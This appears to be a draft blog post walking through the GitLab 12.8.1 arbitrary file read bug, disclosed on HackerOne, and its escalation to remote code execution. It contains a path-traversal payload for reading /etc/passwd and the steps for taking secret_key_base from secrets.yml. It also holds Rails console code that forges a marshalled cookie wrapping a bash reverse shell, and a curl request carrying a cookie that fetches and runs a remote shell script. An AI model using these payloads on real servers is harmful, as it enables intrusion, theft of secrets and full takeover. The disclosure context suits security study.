---
published: false
---

This blog post will cover arbitrary file read vulnerability in GitLab 12.8.1.The vulnerability occurs when moving and issues between projects. [here](https://hackerone.com/reports/827052 "here") you can find the vulnerability in hackerone. Also we can turn this vulnerability into RCE as the *cookies_serializer*. 

## Step 1: Arbitrary file read
First, we need to create two projects. Create two projects and name them Project 1 and Project 2. 
 --img 1--

Then go into project 1 and create an issue. Under Description, field put the following payload and click on submit the issue.

```shell
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)  

```
--img 2 -- 

Then select **Move issue** at bottom most right corner and select project 2 and finally click on **Move **to  move this issue to project 2. 

--img 3 -- 

Once your issue is moved to project1 you can see an attachment of passwd below Issue1. Click on the attachment of the password to download it.

--img 4 --

Now we have confirmed that we can read OS file by this vulnerability.

## Step 2: RCE

We can turns this arbitrary file read into remote code execution. this can be done by first grabbing the **secret_key_base** value from **secrets.yml** using the arbitrary file read and then use the **experimentation_subject_id** cookie with a Marshalled payload.

Following the above step, now we can grab the **secret_key_base** value from **secrets.yml** which is located in **/opt/gitlab/embedded/service/gitlab-rails/config/** and use this to perform an RCE. 

--img 5 -- 

According to the hackerone report  [here](https://hackerone.com/reports/827052 "here") we need to self-hosted gitlab to get the  Marshalled payload. For this, I am going to install GitLab image in my docker as a container. 

```shell
sudo docker run --rm -d -p 4443:443 -p 8090:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0
sudo docker exec -ti bash
```
After that we need to replace the **secret_key_base** in **secrets.yml** file in our local gitlab instance. In the local gitlab server swap the **secret_key_base** value that we grabbed above. 

```shell
nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
```

After reconfigured our GitLab server we can create Marshalled Payload by putting following payloads in gitlab-rails console one by one.

First we need to start rails console.
```shell
gitlab-rails console
```
for cookie generation

```shell
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/YOUR IP PORT 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
We have got a marshalled payload. You can assume it as a cookie. Now using this cookie we will make request to https://gitlabserver.com/users/sign_in and this will get reverse connection on your netcat listener.

```shell
curl -vvv -k 'https://gitlabserver.com/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4xMy9zaGVsbC5zaCB8IGJhc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--94b17553fb6a110472a87df915e1a5765a25219b"

```

## References
https://hackerone.com/reports/827052



